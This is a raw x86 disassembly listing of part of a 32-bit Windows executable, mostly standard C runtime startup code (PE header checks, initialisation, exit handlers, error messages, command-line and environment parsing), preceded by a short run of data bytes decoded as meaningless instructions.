  424314:	repnz lods eax,DWORD PTR ds:[esi]
  424316:	xchg   esi,eax
  424317:	outs   dx,BYTE PTR ds:[esi]
  424318:	fnstsw ax
  42431a:	sti    
  42431b:	mov    ebx,0x6acaec68
  424320:	out    0x93,eax
  424322:	and    al,0xc0
  424324:	mov    esi,0xf8b57847
  424329:	inc    edi
  42432a:	cmp    ah,bh
  42432c:	test   BYTE PTR [ebx],dl
  42432e:	sbb    DWORD PTR [edi],eax
  424330:	or     ebx,esi
  424332:	add    al,0x9d
  424334:	sub    eax,0xad3da8f4
  424339:	xchg   edx,eax
  42433a:	cmp    ch,ch
  42433c:	pop    es
  42433d:	sub    al,0x41
  42433f:	stos   DWORD PTR es:[edi],eax
  424340:	sbb    eax,0xb0b30445
  424345:	sbb    eax,0x46b88ab3
  42434a:	add    edi,DWORD PTR [edi+eax*4+0x3261c0c7]
  424351:	icebp  
  424352:	addr16 dec edi
  424354:	hlt    
  424355:	sbb    ecx,edi
  424357:	jbe    0x424357
  424359:	inc    ecx
  42435a:	mov    ecx,ds
  42435c:	mov    esp,0xd7bf1ffa
  424361:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  424363:	add    eax,DWORD PTR [ecx+0x7a]
  424366:	sti    
  424367:	(bad)  
  424368:	adc    edx,DWORD PTR [ecx+0x3565bf11]
  42436e:	call   0x4fb7:0x42db2a83
  424375:	xchg   esi,eax
  424376:	push   ebx
  424377:	lods   al,BYTE PTR ds:[esi]
  424378:	pop    ebp
  424379:	or     DWORD PTR [edi+ecx*8-0x7],ebx
  42437d:	test   al,0xbb
  42437f:	into   
  424380:	mov    bh,0x52
  424382:	dec    esi
  424383:	out    0xcc,eax
  424385:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424386:	mov    ebp,0x51d41180
  42438b:	sub    ebx,ebx
  42438d:	sub    eax,0x3c1fe13f
  424392:	pop    eax
  424393:	pop    edx
  424394:	out    0x10,al
  424396:	mov    ebx,0xbe9e531d
  42439b:	jge    0x42437d
  42439d:	fild   WORD PTR [esi]
  42439f:	sub    eax,0x5380593d
  4243a4:	out    dx,eax
  4243a5:	push   cs
  4243a6:	jmp    0x93278e10
  4243ab:	cmp    al,0x77
  4243ad:	push   ecx
  4243ae:	inc    ebp
  4243af:	cli    
  4243b0:	sub    al,ch
  4243b2:	sub    ah,BYTE PTR [edi]
  4243b4:	mov    ah,0x61
  4243b6:	jmp    0xcf1ddf6b
  4243bb:	jmp    0xefe5:0xf997b39f
  4243c2:	mov    esi,0x5f275b3d
  4243c7:	mov    dl,0xfa
  4243c9:	hlt    
  4243ca:	cmp    ebx,DWORD PTR [esi+ebp*8-0x76]
  4243ce:	cmp    ecx,DWORD PTR [edx+0x25]
  4243d1:	jns    0x4243f0
  4243d3:	adc    DWORD PTR [ebx+0x25],ebp
  4243d6:	mov    ss,WORD PTR [edi-0x47]
  4243d9:	sar    BYTE PTR [ebx],0x66
  4243dc:	pop    esp
  4243dd:	mov    al,ds:0xb06fad90
  4243e2:	mov    bh,ch
  4243e4:	adc    al,0x70
  4243e6:	pop    edx
  4243e7:	sar    DWORD PTR [eax+0x2b],1
  4243ea:	pop    ebx
  4243eb:	shl    DWORD PTR [esi-0x66],0x6a
  4243ef:	add    BYTE PTR [edx+0x0],ch
  4243f2:	call   0x424400
  4243f7:	xor    eax,eax
  4243f9:	add    esp,0x10
  4243fc:	ret    0x10
  4243ff:	nop
  424400:	jmp    DWORD PTR ds:0x429110
  424406:	cmp    DWORD PTR ds:0x45dabc,0x1
  42440d:	jne    0x424414
  42440f:	call   0x424952
  424414:	push   DWORD PTR [esp+0x4]
  424418:	call   0x4247db
  42441d:	push   0xff
  424422:	call   DWORD PTR ds:0x45d1c0
  424428:	pop    ecx
  424429:	pop    ecx
  42442a:	ret    
  42442b:	cmp    DWORD PTR ds:0x45dabc,0x1
  424432:	jne    0x424439
  424434:	call   0x424952
  424439:	push   DWORD PTR [esp+0x4]
  42443d:	call   0x4247db
  424442:	push   0xff
  424447:	call   0x424621
  42444c:	pop    ecx
  42444d:	pop    ecx
  42444e:	ret    
  42444f:	push   0x60
  424451:	push   0x429220
  424456:	call   0x425340
  42445b:	mov    edi,0x94
  424460:	mov    eax,edi
  424462:	call   0x425390
  424467:	mov    DWORD PTR [ebp-0x18],esp
  42446a:	mov    esi,esp
  42446c:	mov    DWORD PTR [esi],edi
  42446e:	push   esi
  42446f:	call   DWORD PTR ds:0x429054
  424475:	mov    ecx,DWORD PTR [esi+0x10]
  424478:	mov    DWORD PTR ds:0x45dac4,ecx
  42447e:	mov    eax,DWORD PTR [esi+0x4]
  424481:	mov    ds:0x45dad0,eax
  424486:	mov    edx,DWORD PTR [esi+0x8]
  424489:	mov    DWORD PTR ds:0x45dad4,edx
  42448f:	mov    esi,DWORD PTR [esi+0xc]
  424492:	and    esi,0x7fff
  424498:	mov    DWORD PTR ds:0x45dac8,esi
  42449e:	cmp    ecx,0x2
  4244a1:	je     0x4244af
  4244a3:	or     esi,0x8000
  4244a9:	mov    DWORD PTR ds:0x45dac8,esi
  4244af:	shl    eax,0x8
  4244b2:	add    eax,edx
  4244b4:	mov    ds:0x45dacc,eax
  4244b9:	xor    esi,esi
  4244bb:	push   esi
  4244bc:	mov    edi,DWORD PTR ds:0x429024
  4244c2:	call   edi
  4244c4:	cmp    WORD PTR [eax],0x5a4d
  4244c9:	jne    0x4244ea
  4244cb:	mov    ecx,DWORD PTR [eax+0x3c]
  4244ce:	add    ecx,eax
  4244d0:	cmp    DWORD PTR [ecx],0x4550
  4244d6:	jne    0x4244ea
  4244d8:	movzx  eax,WORD PTR [ecx+0x18]
  4244dc:	cmp    eax,0x10b
  4244e1:	je     0x424502
  4244e3:	cmp    eax,0x20b
  4244e8:	je     0x4244ef
  4244ea:	mov    DWORD PTR [ebp-0x1c],esi
  4244ed:	jmp    0x424516
  4244ef:	cmp    DWORD PTR [ecx+0x84],0xe
  4244f6:	jbe    0x4244ea
  4244f8:	xor    eax,eax
  4244fa:	cmp    DWORD PTR [ecx+0xf8],esi
  424500:	jmp    0x424510
  424502:	cmp    DWORD PTR [ecx+0x74],0xe
  424506:	jbe    0x4244ea
  424508:	xor    eax,eax
  42450a:	cmp    DWORD PTR [ecx+0xe8],esi
  424510:	setne  al
  424513:	mov    DWORD PTR [ebp-0x1c],eax
  424516:	push   0x1
  424518:	call   0x4252ed
  42451d:	pop    ecx
  42451e:	test   eax,eax
  424520:	jne    0x42452a
  424522:	push   0x1c
  424524:	call   0x42442b
  424529:	pop    ecx
  42452a:	call   0x425264
  42452f:	test   eax,eax
  424531:	jne    0x42453b
  424533:	push   0x10
  424535:	call   0x42442b
  42453a:	pop    ecx
  42453b:	call   0x42514d
  424540:	mov    DWORD PTR [ebp-0x4],esi
  424543:	call   0x424f4f
  424548:	test   eax,eax
  42454a:	jge    0x424554
  42454c:	push   0x1b
  42454e:	call   0x424406
  424553:	pop    ecx
  424554:	call   DWORD PTR ds:0x429050
  42455a:	mov    ds:0x45e274,eax
  42455f:	call   0x424e2d
  424564:	mov    ds:0x45dab4,eax
  424569:	call   0x424d8b
  42456e:	test   eax,eax
  424570:	jge    0x42457a
  424572:	push   0x8
  424574:	call   0x424406
  424579:	pop    ecx
  42457a:	call   0x424b58
  42457f:	test   eax,eax
  424581:	jge    0x42458b
  424583:	push   0x9
  424585:	call   0x424406
  42458a:	pop    ecx
  42458b:	call   0x424663
  424590:	mov    DWORD PTR [ebp-0x20],eax
  424593:	cmp    eax,esi
  424595:	je     0x42459e
  424597:	push   eax
  424598:	call   0x424406
  42459d:	pop    ecx
  42459e:	mov    DWORD PTR [ebp-0x38],esi
  4245a1:	lea    eax,[ebp-0x64]
  4245a4:	push   eax
  4245a5:	call   DWORD PTR ds:0x42904c
  4245ab:	call   0x424aef
  4245b0:	mov    DWORD PTR [ebp-0x68],eax
  4245b3:	test   BYTE PTR [ebp-0x38],0x1
  4245b7:	je     0x4245bf
  4245b9:	movzx  eax,WORD PTR [ebp-0x34]
  4245bd:	jmp    0x4245c2
  4245bf:	push   0xa
  4245c1:	pop    eax
  4245c2:	push   eax
  4245c3:	push   DWORD PTR [ebp-0x68]
  4245c6:	push   esi
  4245c7:	push   esi
  4245c8:	call   edi
  4245ca:	push   eax
  4245cb:	call   0x422f80
  4245d0:	mov    edi,eax
  4245d2:	mov    DWORD PTR [ebp-0x6c],edi
  4245d5:	cmp    DWORD PTR [ebp-0x1c],esi
  4245d8:	jne    0x4245e0
  4245da:	push   edi
  4245db:	call   0x42479b
  4245e0:	call   0x4247bd
  4245e5:	jmp    0x424612
  4245e7:	mov    eax,DWORD PTR [ebp-0x14]
  4245ea:	mov    ecx,DWORD PTR [eax]
  4245ec:	mov    ecx,DWORD PTR [ecx]
  4245ee:	mov    DWORD PTR [ebp-0x70],ecx
  4245f1:	push   eax
  4245f2:	push   ecx
  4245f3:	call   0x42498b
  4245f8:	pop    ecx
  4245f9:	pop    ecx
  4245fa:	ret    
  4245fb:	mov    esp,DWORD PTR [ebp-0x18]
  4245fe:	mov    edi,DWORD PTR [ebp-0x70]
  424601:	cmp    DWORD PTR [ebp-0x1c],0x0
  424605:	jne    0x42460d
  424607:	push   edi
  424608:	call   0x4247ac
  42460d:	call   0x4247cc
  424612:	or     DWORD PTR [ebp-0x4],0xffffffff
  424616:	mov    eax,edi
  424618:	lea    esp,[ebp-0x7c]
  42461b:	call   0x42537b
  424620:	ret    
  424621:	push   0x42923c
  424626:	call   DWORD PTR ds:0x429024
  42462c:	test   eax,eax
  42462e:	je     0x424646
  424630:	push   0x42922c
  424635:	push   eax
  424636:	call   DWORD PTR ds:0x429020
  42463c:	test   eax,eax
  42463e:	je     0x424646
  424640:	push   DWORD PTR [esp+0x4]
  424644:	call   eax
  424646:	push   DWORD PTR [esp+0x4]
  42464a:	call   DWORD PTR ds:0x429058
  424650:	int3   
  424651:	push   0x8
  424653:	call   0x4254ff
  424658:	pop    ecx
  424659:	ret    
  42465a:	push   0x8
  42465c:	call   0x42546b
  424661:	pop    ecx
  424662:	ret    
  424663:	mov    eax,ds:0x45e270
  424668:	test   eax,eax
  42466a:	je     0x42466e
  42466c:	call   eax
  42466e:	push   esi
  42466f:	push   edi
  424670:	mov    ecx,0x42b00c
  424675:	mov    edi,0x42b018
  42467a:	xor    eax,eax
  42467c:	cmp    ecx,edi
  42467e:	mov    esi,ecx
  424680:	jae    0x424699
  424682:	test   eax,eax
  424684:	jne    0x4246c5
  424686:	mov    ecx,DWORD PTR [esi]
  424688:	test   ecx,ecx
  42468a:	je     0x42468e
  42468c:	call   ecx
  42468e:	add    esi,0x4
  424691:	cmp    esi,edi
  424693:	jb     0x424682
  424695:	test   eax,eax
  424697:	jne    0x4246c5
  424699:	push   0x425191
  42469e:	call   0x425610
  4246a3:	mov    esi,0x42b000
  4246a8:	mov    eax,esi
  4246aa:	mov    edi,0x42b008
  4246af:	cmp    eax,edi
  4246b1:	pop    ecx
  4246b2:	jae    0x4246c3
  4246b4:	mov    eax,DWORD PTR [esi]
  4246b6:	test   eax,eax
  4246b8:	je     0x4246bc
  4246ba:	call   eax
  4246bc:	add    esi,0x4
  4246bf:	cmp    esi,edi
  4246c1:	jb     0x4246b4
  4246c3:	xor    eax,eax
  4246c5:	pop    edi
  4246c6:	pop    esi
  4246c7:	ret    
  4246c8:	push   ebp
  4246c9:	mov    ebp,esp
  4246cb:	push   esi
  4246cc:	push   edi
  4246cd:	push   0x8
  4246cf:	call   0x4254ff
  4246d4:	xor    esi,esi
  4246d6:	inc    esi
  4246d7:	cmp    DWORD PTR ds:0x45db04,esi
  4246dd:	pop    ecx
  4246de:	jne    0x4246f0
  4246e0:	push   DWORD PTR [ebp+0x8]
  4246e3:	call   DWORD PTR ds:0x429060
  4246e9:	push   eax
  4246ea:	call   DWORD PTR ds:0x42905c
  4246f0:	cmp    DWORD PTR [ebp+0xc],0x0
  4246f4:	mov    al,BYTE PTR [ebp+0x10]
  4246f7:	mov    DWORD PTR ds:0x45db00,esi
  4246fd:	mov    ds:0x45dafc,al
  424702:	jne    0x424756
  424704:	mov    ecx,DWORD PTR ds:0x45e268
  42470a:	test   ecx,ecx
  42470c:	je     0x424737
  42470e:	mov    eax,ds:0x45e264
  424713:	sub    eax,0x4
  424716:	cmp    eax,ecx
  424718:	jmp    0x424730
  42471a:	mov    eax,DWORD PTR [eax]
  42471c:	test   eax,eax
  42471e:	je     0x424722
  424720:	call   eax
  424722:	mov    eax,ds:0x45e264
  424727:	sub    eax,0x4
  42472a:	cmp    eax,DWORD PTR ds:0x45e268
  424730:	mov    ds:0x45e264,eax
  424735:	jae    0x42471a
  424737:	mov    eax,0x42b01c
  42473c:	mov    esi,0x42b020
  424741:	cmp    eax,esi
  424743:	mov    edi,eax
  424745:	jae    0x424756
  424747:	mov    eax,DWORD PTR [edi]
  424749:	test   eax,eax
  42474b:	je     0x42474f
  42474d:	call   eax
  42474f:	add    edi,0x4
  424752:	cmp    edi,esi
  424754:	jb     0x424747
  424756:	mov    eax,0x42b024
  42475b:	mov    esi,0x42b028
  424760:	cmp    eax,esi
  424762:	mov    edi,eax
  424764:	jae    0x424775
  424766:	mov    eax,DWORD PTR [edi]
  424768:	test   eax,eax
  42476a:	je     0x42476e
  42476c:	call   eax
  42476e:	add    edi,0x4
  424771:	cmp    edi,esi
  424773:	jb     0x424766
  424775:	cmp    DWORD PTR [ebp+0x10],0x0
  424779:	pop    edi
  42477a:	pop    esi
  42477b:	je     0x424786
  42477d:	push   0x8
  42477f:	call   0x42546b
  424784:	jmp    0x424798
  424786:	push   DWORD PTR [ebp+0x8]
  424789:	mov    DWORD PTR ds:0x45db04,0x1
  424793:	call   0x424621
  424798:	pop    ecx
  424799:	pop    ebp
  42479a:	ret    
  42479b:	push   0x0
  42479d:	push   0x0
  42479f:	push   DWORD PTR [esp+0xc]
  4247a3:	call   0x4246c8
  4247a8:	add    esp,0xc
  4247ab:	ret    
  4247ac:	push   0x0
  4247ae:	push   0x1
  4247b0:	push   DWORD PTR [esp+0xc]
  4247b4:	call   0x4246c8
  4247b9:	add    esp,0xc
  4247bc:	ret    
  4247bd:	push   0x1
  4247bf:	push   0x0
  4247c1:	push   0x0
  4247c3:	call   0x4246c8
  4247c8:	add    esp,0xc
  4247cb:	ret    
  4247cc:	push   0x1
  4247ce:	push   0x1
  4247d0:	push   0x0
  4247d2:	call   0x4246c8
  4247d7:	add    esp,0xc
  4247da:	ret    
  4247db:	push   ebp
  4247dc:	mov    ebp,esp
  4247de:	sub    esp,0x10c
  4247e4:	mov    eax,ds:0x45d430
  4247e9:	xor    eax,DWORD PTR [ebp+0x4]
  4247ec:	mov    ecx,DWORD PTR [ebp+0x8]
  4247ef:	push   ebx
  4247f0:	push   esi
  4247f1:	mov    DWORD PTR [ebp-0x4],eax
  4247f4:	xor    edx,edx
  4247f6:	push   edi
  4247f7:	xor    eax,eax
  4247f9:	cmp    ecx,DWORD PTR [eax*8+0x45d1c8]
  424800:	je     0x424808
  424802:	inc    eax
  424803:	cmp    eax,0x12
  424806:	jb     0x4247f9
  424808:	mov    esi,eax
  42480a:	shl    esi,0x3
  42480d:	cmp    ecx,DWORD PTR [esi+0x45d1c8]
  424813:	jne    0x42493c
  424819:	mov    eax,ds:0x45dabc
  42481e:	cmp    eax,0x1
  424821:	je     0x424917
  424827:	cmp    eax,edx
  424829:	jne    0x424838
  42482b:	cmp    DWORD PTR ds:0x45d1c4,0x1
  424832:	je     0x424917
  424838:	cmp    ecx,0xfc
  42483e:	je     0x42493c
  424844:	push   0x104
  424849:	lea    eax,[ebp-0x10c]
  42484f:	push   eax
  424850:	push   edx
  424851:	mov    BYTE PTR [ebp-0x8],dl
  424854:	call   DWORD PTR ds:0x429068
  42485a:	test   eax,eax
  42485c:	jne    0x424871
  42485e:	lea    eax,[ebp-0x10c]
  424864:	push   0x429594
  424869:	push   eax
  42486a:	call   0x425720
  42486f:	pop    ecx
  424870:	pop    ecx
  424871:	lea    eax,[ebp-0x10c]
  424877:	push   eax
  424878:	lea    edi,[ebp-0x10c]
  42487e:	call   0x425950
  424883:	inc    eax
  424884:	cmp    eax,0x3c
  424887:	pop    ecx
  424888:	jbe    0x4248b3
  42488a:	lea    eax,[ebp-0x10c]
  424890:	push   eax
  424891:	call   0x425950
  424896:	mov    edi,eax
  424898:	lea    eax,[ebp-0x10c]
  42489e:	sub    eax,0x3b
  4248a1:	push   0x3
  4248a3:	add    edi,eax
  4248a5:	push   0x429590
  4248aa:	push   edi
  4248ab:	call   0x425820
  4248b0:	add    esp,0x10
  4248b3:	push   edi
  4248b4:	call   0x425950
  4248b9:	push   DWORD PTR [esi+0x45d1cc]
  4248bf:	mov    ebx,eax
  4248c1:	call   0x425950
  4248c6:	lea    eax,[ebx+eax*1+0x1c]
  4248ca:	pop    ecx
  4248cb:	add    eax,0x3
  4248ce:	pop    ecx
  4248cf:	and    eax,0xfffffffc
  4248d2:	call   0x425390
  4248d7:	mov    ebx,esp
  4248d9:	push   0x429574
  4248de:	push   ebx
  4248df:	call   0x425720
  4248e4:	push   edi
  4248e5:	push   ebx
  4248e6:	call   0x425730
  4248eb:	push   0x429570
  4248f0:	push   ebx
  4248f1:	call   0x425730
  4248f6:	push   DWORD PTR [esi+0x45d1cc]
  4248fc:	push   ebx
  4248fd:	call   0x425730
  424902:	push   0x12010
  424907:	push   0x429548
  42490c:	push   ebx
  42490d:	call   0x425622
  424912:	add    esp,0x2c
  424915:	jmp    0x42493c
  424917:	push   edx
  424918:	lea    eax,[ebp+0x8]
  42491b:	push   eax
  42491c:	lea    esi,[esi+0x45d1cc]
  424922:	push   DWORD PTR [esi]
  424924:	call   0x425950
  424929:	pop    ecx
  42492a:	push   eax
  42492b:	push   DWORD PTR [esi]
  42492d:	push   0xfffffff4
  42492f:	call   DWORD PTR ds:0x429064
  424935:	push   eax
  424936:	call   DWORD PTR ds:0x42900c
  42493c:	lea    esp,[ebp-0x118]
  424942:	mov    ecx,DWORD PTR [ebp-0x4]
  424945:	xor    ecx,DWORD PTR [ebp+0x4]
  424948:	call   0x425a0c
  42494d:	pop    edi
  42494e:	pop    esi
  42494f:	pop    ebx
  424950:	leave  
  424951:	ret    
  424952:	mov    eax,ds:0x45dabc
  424957:	cmp    eax,0x1
  42495a:	je     0x424969
  42495c:	test   eax,eax
  42495e:	jne    0x42498a
  424960:	cmp    DWORD PTR ds:0x45d1c4,0x1
  424967:	jne    0x42498a
  424969:	push   0xfc
  42496e:	call   0x4247db
  424973:	mov    eax,ds:0x45db08
  424978:	test   eax,eax
  42497a:	pop    ecx
  42497b:	je     0x42497f
  42497d:	call   eax
  42497f:	push   0xff
  424984:	call   0x4247db
  424989:	pop    ecx
  42498a:	ret    
  42498b:	push   ebp
  42498c:	mov    ebp,esp
  42498e:	push   ecx
  42498f:	push   ebx
  424990:	push   esi
  424991:	push   edi
  424992:	call   0x4251f3
  424997:	mov    edi,DWORD PTR [ebp+0x8]
  42499a:	mov    esi,eax
  42499c:	mov    edx,DWORD PTR [esi+0x54]
  42499f:	mov    eax,ds:0x45d2dc
  4249a4:	mov    ecx,edx
  4249a6:	cmp    DWORD PTR [ecx],edi
  4249a8:	je     0x4249b7
  4249aa:	lea    ebx,[eax+eax*2]
  4249ad:	add    ecx,0xc
  4249b0:	lea    ebx,[edx+ebx*4]
  4249b3:	cmp    ecx,ebx
  4249b5:	jb     0x4249a6
  4249b7:	lea    eax,[eax+eax*2]
  4249ba:	lea    eax,[edx+eax*4]
  4249bd:	cmp    ecx,eax
  4249bf:	jae    0x4249c5
  4249c1:	cmp    DWORD PTR [ecx],edi
  4249c3:	je     0x4249c7
  4249c5:	xor    ecx,ecx
  4249c7:	test   ecx,ecx
  4249c9:	je     0x424ae1
  4249cf:	mov    ebx,DWORD PTR [ecx+0x8]
  4249d2:	test   ebx,ebx
  4249d4:	mov    DWORD PTR [ebp+0x8],ebx
  4249d7:	je     0x424ae1
  4249dd:	cmp    ebx,0x5
  4249e0:	jne    0x4249ee
  4249e2:	and    DWORD PTR [ecx+0x8],0x0
  4249e6:	xor    eax,eax
  4249e8:	inc    eax
  4249e9:	jmp    0x424aea
  4249ee:	cmp    ebx,0x1
  4249f1:	je     0x424adc
  4249f7:	mov    eax,DWORD PTR [esi+0x58]
  4249fa:	mov    DWORD PTR [ebp-0x4],eax
  4249fd:	mov    eax,DWORD PTR [ebp+0xc]
  424a00:	mov    DWORD PTR [esi+0x58],eax
  424a03:	mov    eax,DWORD PTR [ecx+0x4]
  424a06:	cmp    eax,0x8
  424a09:	jne    0x424ace
  424a0f:	mov    edx,DWORD PTR ds:0x45d2d0
  424a15:	mov    eax,ds:0x45d2d4
  424a1a:	add    eax,edx
  424a1c:	cmp    edx,eax
  424a1e:	jge    0x424a47
  424a20:	lea    eax,[edx+edx*2]
  424a23:	shl    eax,0x2
  424a26:	mov    edi,DWORD PTR [esi+0x54]
  424a29:	and    DWORD PTR [eax+edi*1+0x8],0x0
  424a2e:	mov    edi,DWORD PTR ds:0x45d2d0
  424a34:	mov    ebx,DWORD PTR ds:0x45d2d4
  424a3a:	inc    edx
  424a3b:	add    ebx,edi
  424a3d:	add    eax,0xc
  424a40:	cmp    edx,ebx
  424a42:	jl     0x424a26
  424a44:	mov    ebx,DWORD PTR [ebp+0x8]
  424a47:	mov    ecx,DWORD PTR [ecx]
  424a49:	cmp    ecx,0xc000008e
  424a4f:	mov    edi,DWORD PTR [esi+0x5c]
  424a52:	jne    0x424a5d
  424a54:	mov    DWORD PTR [esi+0x5c],0x83
  424a5b:	jmp    0x424ac1
  424a5d:	cmp    ecx,0xc0000090
  424a63:	jne    0x424a6e
  424a65:	mov    DWORD PTR [esi+0x5c],0x81
  424a6c:	jmp    0x424ac1
  424a6e:	cmp    ecx,0xc0000091
  424a74:	jne    0x424a7f
  424a76:	mov    DWORD PTR [esi+0x5c],0x84
  424a7d:	jmp    0x424ac1
  424a7f:	cmp    ecx,0xc0000093
  424a85:	jne    0x424a90
  424a87:	mov    DWORD PTR [esi+0x5c],0x85
  424a8e:	jmp    0x424ac1
  424a90:	cmp    ecx,0xc000008d
  424a96:	jne    0x424aa1
  424a98:	mov    DWORD PTR [esi+0x5c],0x82
  424a9f:	jmp    0x424ac1
  424aa1:	cmp    ecx,0xc000008f
  424aa7:	jne    0x424ab2
  424aa9:	mov    DWORD PTR [esi+0x5c],0x86
  424ab0:	jmp    0x424ac1
  424ab2:	cmp    ecx,0xc0000092
  424ab8:	jne    0x424ac1
  424aba:	mov    DWORD PTR [esi+0x5c],0x8a
  424ac1:	push   DWORD PTR [esi+0x5c]
  424ac4:	push   0x8
  424ac6:	call   ebx
  424ac8:	pop    ecx
  424ac9:	mov    DWORD PTR [esi+0x5c],edi
  424acc:	jmp    0x424ad5
  424ace:	and    DWORD PTR [ecx+0x8],0x0
  424ad2:	push   eax
  424ad3:	call   ebx
  424ad5:	mov    eax,DWORD PTR [ebp-0x4]
  424ad8:	pop    ecx
  424ad9:	mov    DWORD PTR [esi+0x58],eax
  424adc:	or     eax,0xffffffff
  424adf:	jmp    0x424aea
  424ae1:	push   DWORD PTR [ebp+0xc]
  424ae4:	call   DWORD PTR ds:0x42906c
  424aea:	pop    edi
  424aeb:	pop    esi
  424aec:	pop    ebx
  424aed:	leave  
  424aee:	ret    
  424aef:	cmp    DWORD PTR ds:0x45e26c,0x0
  424af6:	jne    0x424afd
  424af8:	call   0x425f2c
  424afd:	push   esi
  424afe:	mov    esi,DWORD PTR ds:0x45e274
  424b04:	test   esi,esi
  424b06:	jne    0x424b0f
  424b08:	mov    esi,0x4295ab
  424b0d:	jmp    0x424b54
  424b0f:	mov    al,BYTE PTR [esi]
  424b11:	cmp    al,0x22
  424b13:	jne    0x424b3d
  424b15:	inc    esi
  424b16:	mov    al,BYTE PTR [esi]
  424b18:	cmp    al,0x22
  424b1a:	je     0x424b4d
  424b1c:	test   al,al
  424b1e:	je     0x424b36
  424b20:	movzx  eax,al
  424b23:	push   eax
  424b24:	call   0x425a4b
  424b29:	test   eax,eax
  424b2b:	pop    ecx
  424b2c:	je     0x424b2f
  424b2e:	inc    esi
  424b2f:	inc    esi
  424b30:	mov    al,BYTE PTR [esi]
  424b32:	cmp    al,0x22
  424b34:	jne    0x424b1c
  424b36:	cmp    BYTE PTR [esi],0x22
  424b39:	jne    0x424b4e
  424b3b:	jmp    0x424b4d
  424b3d:	cmp    al,0x20
  424b3f:	jbe    0x424b4e
  424b41:	inc    esi
  424b42:	cmp    BYTE PTR [esi],0x20
  424b45:	ja     0x424b41
  424b47:	jmp    0x424b4e
  424b49:	cmp    al,0x20
  424b4b:	ja     0x424b54
  424b4d:	inc    esi
  424b4e:	mov    al,BYTE PTR [esi]
  424b50:	test   al,al
  424b52:	jne    0x424b49
  424b54:	mov    eax,esi
  424b56:	pop    esi
  424b57:	ret    
  424b58:	push   ebx
  424b59:	xor    ebx,ebx
  424b5b:	cmp    DWORD PTR ds:0x45e26c,ebx
  424b61:	push   esi
  424b62:	push   edi
  424b63:	jne    0x424b6a
  424b65:	call   0x425f2c
  424b6a:	mov    esi,DWORD PTR ds:0x45dab4
  424b70:	xor    edi,edi
  424b72:	cmp    esi,ebx
  424b74:	jne    0x424b88
  424b76:	jmp    0x424ba8
  424b78:	cmp    al,0x3d
  424b7a:	je     0x424b7d
  424b7c:	inc    edi
  424b7d:	push   esi
  424b7e:	call   0x425950
  424b83:	pop    ecx
  424b84:	lea    esi,[esi+eax*1+0x1]
  424b88:	mov    al,BYTE PTR [esi]
  424b8a:	cmp    al,bl
  424b8c:	jne    0x424b78
  424b8e:	lea    eax,[edi*4+0x4]
  424b95:	push   eax
  424b96:	call   0x426062
  424b9b:	mov    edi,eax
  424b9d:	cmp    edi,ebx
  424b9f:	pop    ecx
  424ba0:	mov    DWORD PTR ds:0x45dae4,edi
  424ba6:	jne    0x424bad
  424ba8:	or     eax,0xffffffff
  424bab:	jmp    0x424c05
  424bad:	mov    esi,DWORD PTR ds:0x45dab4
  424bb3:	push   ebp
  424bb4:	jmp    0x424be0
  424bb6:	push   esi
  424bb7:	call   0x425950
  424bbc:	mov    ebp,eax
  424bbe:	inc    ebp
  424bbf:	cmp    BYTE PTR [esi],0x3d
  424bc2:	pop    ecx
  424bc3:	je     0x424bde
  424bc5:	push   ebp
  424bc6:	call   0x426062
  424bcb:	cmp    eax,ebx
  424bcd:	pop    ecx
  424bce:	mov    DWORD PTR [edi],eax
  424bd0:	je     0x424c09
  424bd2:	push   esi
  424bd3:	push   eax
  424bd4:	call   0x425720
  424bd9:	pop    ecx
  424bda:	pop    ecx
  424bdb:	add    edi,0x4
  424bde:	add    esi,ebp
  424be0:	cmp    BYTE PTR [esi],bl
  424be2:	jne    0x424bb6
  424be4:	push   DWORD PTR ds:0x45dab4
  424bea:	call   0x425f4a
  424bef:	mov    DWORD PTR ds:0x45dab4,ebx
  424bf5:	mov    DWORD PTR [edi],ebx
  424bf7:	mov    DWORD PTR ds:0x45e260,0x1
  424c01:	xor    eax,eax
  424c03:	pop    ecx
  424c04:	pop    ebp
  424c05:	pop    edi
  424c06:	pop    esi
  424c07:	pop    ebx
  424c08:	ret    
  424c09:	push   DWORD PTR ds:0x45dae4
  424c0f:	call   0x425f4a
  424c14:	mov    DWORD PTR ds:0x45dae4,ebx
  424c1a:	or     eax,0xffffffff
  424c1d:	jmp    0x424c03
  424c1f:	push   ebp
  424c20:	mov    ebp,esp
  424c22:	push   ecx
  424c23:	push   ebx
  424c24:	mov    ebx,DWORD PTR [ebp+0xc]
  424c27:	xor    edx,edx
  424c29:	cmp    DWORD PTR [ebp+0x8],edx
  424c2c:	push   edi
  424c2d:	mov    DWORD PTR [esi],edx
  424c2f:	mov    edi,ecx
  424c31:	mov    DWORD PTR [ebx],0x1
  424c37:	je     0x424c42
  424c39:	mov    ecx,DWORD PTR [ebp+0x8]
  424c3c:	add    DWORD PTR [ebp+0x8],0x4
  424c40:	mov    DWORD PTR [ecx],edi
  424c42:	cmp    BYTE PTR [eax],0x22
  424c45:	jne    0x424c55
  424c47:	xor    ecx,ecx
  424c49:	test   edx,edx
  424c4b:	sete   cl
  424c4e:	inc    eax
  424c4f:	mov    edx,ecx
  424c51:	mov    cl,0x22
  424c53:	jmp    0x424c82
  424c55:	inc    DWORD PTR [esi]
  424c57:	test   edi,edi
  424c59:	je     0x424c60
  424c5b:	mov    cl,BYTE PTR [eax]
  424c5d:	mov    BYTE PTR [edi],cl
  424c5f:	inc    edi
  424c60:	mov    cl,BYTE PTR [eax]
  424c62:	movzx  ebx,cl
  424c65:	inc    eax
  424c66:	test   BYTE PTR [ebx+0x45df21],0x4
  424c6d:	je     0x424c7b
  424c6f:	inc    DWORD PTR [esi]
  424c71:	test   edi,edi
  424c73:	je     0x424c7a
  424c75:	mov    bl,BYTE PTR [eax]
  424c77:	mov    BYTE PTR [edi],bl
  424c79:	inc    edi
  424c7a:	inc    eax
  424c7b:	test   cl,cl
  424c7d:	mov    ebx,DWORD PTR [ebp+0xc]
  424c80:	je     0x424cb4
  424c82:	test   edx,edx
  424c84:	jne    0x424c42
  424c86:	cmp    cl,0x20
  424c89:	je     0x424c90
  424c8b:	cmp    cl,0x9
  424c8e:	jne    0x424c42
  424c90:	test   edi,edi
  424c92:	je     0x424c98
  424c94:	and    BYTE PTR [edi-0x1],0x0
  424c98:	and    DWORD PTR [ebp-0x4],0x0
  424c9c:	cmp    BYTE PTR [eax],0x0
  424c9f:	je     0x424d7b
  424ca5:	mov    cl,BYTE PTR [eax]
  424ca7:	cmp    cl,0x20
  424caa:	je     0x424cb1
  424cac:	cmp    cl,0x9
  424caf:	jne    0x424cb7
  424cb1:	inc    eax
